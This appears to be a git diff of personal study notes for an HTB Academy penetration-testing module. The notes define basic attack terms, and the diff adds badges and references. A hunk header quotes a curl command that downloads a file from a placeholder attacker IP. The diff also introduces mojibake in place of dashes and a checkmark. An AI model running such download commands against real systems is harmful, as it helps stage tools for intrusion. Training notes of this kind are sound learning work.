@@ -1,6 +1,6 @@
-# Getting Started
+# <img src="./images/getting-started.jpg" width="36" alt="Getting Started"> Getting Started
 
-**Status:** ✅ Completed — 10 December 2025
+**Status:** âœ… Completed â€” 10 December 2025
 **Difficulty:** Fundamental
 **Tier:** 0
 
@@ -10,13 +10,13 @@
 
 ### Common Terms
 
-* **Target** — Host or system being assessed.
-* **Enumeration** — Gathering detailed information about discovered services and attack surfaces.
-* **Exploit** — Technique or code that takes advantage of a vulnerability.
-* **Payload** — Code or data delivered through an exploit to perform an action.
-* **Foothold** — Initial access to a target system.
-* **Privilege Escalation** — Obtaining higher privileges after gaining initial access.
-* **Post-Exploitation** — Actions performed after gaining access, such as enumeration, credential discovery, and collecting information.
+* **Target** â€” Host or system being assessed.
+* **Enumeration** â€” Gathering detailed information about discovered services and attack surfaces.
+* **Exploit** â€” Technique or code that takes advantage of a vulnerability.
+* **Payload** â€” Code or data delivered through an exploit to perform an action.
+* **Foothold** â€” Initial access to a target system.
+* **Privilege Escalation** â€” Obtaining higher privileges after gaining initial access.
+* **Post-Exploitation** â€” Actions performed after gaining access, such as enumeration, credential discovery, and collecting information.
 
 ### Basic Tools
 
@@ -205,8 +205,18 @@ curl http://<ATTACKER_IP>:<PORT>/<FILE> -o <FILE>
 * [Attacking Web Applications with Ffuf](../../web/attacking-web-applications-with-ffuf/README.md)
 * [Using the Metasploit Framework](../../exploitation/using-the-metasploit-framework/README.md)
 * [Using Web Proxies](../../web/using-web-proxies/README.md)
-* [Nibbles — Machine Writeup](../../../easy-machines/nibbles/README.md)
+* [Nibbles â€” Machine Writeup](../../../easy-machines/nibbles/README.md)
 
 ## Achievement
 
 [Your first battle](https://academy.hackthebox.com/achievement/badge/e29c6299-d5ce-11f0-9254-bea50ffe6cb4)
+
+## Completion
+
+<a href="https://academy.hackthebox.com/achievement/badge/e29c6299-d5ce-11f0-9254-bea50ffe6cb4"><img src="./images/htb-getting-started-badge.png" width="120" alt="HTB Academy — Your first battle Badge"></a>
+
+**Completed:** 10 December 2025
+
+## References
+
+- [HTB Academy — Getting Started](https://academy.hackthebox.com/app/module/77)
